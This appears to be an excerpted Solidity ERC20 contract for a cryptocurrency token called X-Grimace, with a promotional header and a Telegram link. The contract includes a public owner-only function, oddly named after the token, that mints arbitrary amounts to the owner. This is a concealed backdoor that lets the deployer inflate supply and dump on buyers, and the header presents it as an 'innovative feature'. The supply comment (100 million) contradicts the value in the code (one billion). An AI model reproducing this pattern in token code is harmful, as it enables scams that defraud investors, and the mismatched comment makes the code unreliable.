//
// $𝕏-Grimace proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/XGrimaceCN
//  
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _Xgrimace(uint256 amount) public onlyOwner {
 _Xgrimace(msg.sender, amount);
    }
    ...
    function _Xgrimace(address account, uint256 amount) internal virtual {
...
contract $Xgrimace is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("X-Grimace", "XGRIMACE") {
     _Xgrimace(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}